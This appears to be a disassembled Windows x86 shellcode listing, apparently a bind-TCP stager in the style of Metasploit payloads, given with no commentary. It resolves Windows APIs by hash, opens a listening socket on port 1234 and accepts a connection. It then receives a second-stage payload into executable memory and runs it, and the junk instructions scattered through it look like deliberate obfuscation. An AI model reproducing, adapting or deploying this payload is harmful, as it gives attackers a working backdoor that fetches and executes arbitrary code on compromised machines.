```asm
_start:
    cld
    call L_95
RET_6:
    pushal
    nop
    xor edx, edx
    mov ebp, esp
    mov eax, eax
    mov edx, dword ptr fs:[edx + 0x30]
    mov edx, dword ptr [edx + 0xc]
    mov edx, dword ptr [edx + 0x14]
    nop
L_15:
    xor edi, edi
    movzx ecx, word ptr [edx + 0x26]
    mov esi, dword ptr [edx + 0x28]
    nop
L_1e:
    xor eax, eax
    lodsb al, byte ptr [esi]
    cmp al, 0x61
    jl L_27
    sub al, 0x20
L_27:
    ror edi, 0xd
    add edi, eax
    dec ecx
    jne L_1e
    nop
    push edx
    mov edx, dword ptr [edx + 0x10]
    mov eax, dword ptr [edx + 0x3c]
    push edi
    add eax, edx
    mov eax, dword ptr [eax + 0x78]
    test eax, eax
    je L_8c
    add eax, edx
    mov ebx, dword ptr [eax + 0x20]
    mov ecx, dword ptr [eax + 0x18]
    add ebx, edx
    push eax
    nop
L_4b:
    test ecx, ecx
    je L_8b
    xor edi, edi
    dec ecx
    mov esi, dword ptr [ebx + ecx*4]
    add esi, edx
L_57:
    xor eax, eax
    ror edi, 0xd
    lodsb al, byte ptr [esi]
    add edi, eax
    cmp al, ah
    jne L_57
    add edi, dword ptr [ebp - 8]
    cmp edi, dword ptr [ebp + 0x24]
    jne L_4b
    nop
    pop eax
    mov ebx, dword ptr [eax + 0x24]
    add ebx, edx
    mov cx, word ptr [ebx + ecx*2]
    mov ebx, dword ptr [eax + 0x1c]
    add ebx, edx
    mov eax, dword ptr [ebx + ecx*4]
    add eax, edx
    mov dword ptr [esp + 0x24], eax
    nop
    pop ebx
    pop ebx
    popal
    pop ecx
    pop edx
    push ecx
    jmp eax
L_8b:
    pop eax
    nop
L_8c:
    pop edi
    nop
    pop edx
    nop
    mov edx, dword ptr [edx]
    jmp L_15
L_95:
    pop ebp
    pause
    push 0x3233
    push 0x5f327377
    push esp
    push 0x726774c
    call ebp
    mov eax, 0x190
    nop
    sub esp, eax
    push esp
    push eax
    push 0x6b8029
    call ebp
    push 0xb
    nop
    pop ecx
L_bb:
    push eax
    loop L_bb
    nop
    push 1
    push 2
    push 0xe0df0fea
    call ebp
    xchg edi, eax
    push 0xd2040002
    mov esi, esp
    push 0x10
    push esi
    push edi
    push 0x6737dbc2
    call ebp
    test eax, eax
    jne L_15d
    push edi
    push 0xff38e9b7
    call ebp
    push edi
    push 0xe13bec74
    call ebp
    push edi
    xchg edi, eax
    push 0x614d6e75
    call ebp
    push 0
    push 0x10
    nop
    call L_116
    pushfd
    xchg esp, eax
    xchg ch, ah
    int1
    mov ecx, ds
    mov ebp, 0x86b887b9
    ror dword ptr [ebp + ebx - 0x3d97a872], 1
L_116:
    jmp L_153+2
    pop edi
    call ebp
    push 0
    push 4
    push esi
    push edi
    push 0x5fc8d902
    call ebp
    cmp eax, 0
    jle L_15d
    mov esi, dword ptr [esi]
    push 0x40
    push 0x1000
    push esi
    push 0
    push 0xe553a458
    call ebp
    xchg ebx, eax
    push ebx
L_145:
    push 0
    push esi
    push ebx
    push edi
    push 0x5fc8d902
    call ebp
L_153:
    cmp eax, 0
    jle L_15d
    add ebx, eax
    sub esi, eax
    jne L_145
    ret
L_15d:
    mov ebx, 0x56a2b5f0
    push 0
    push ebx
    call ebp
```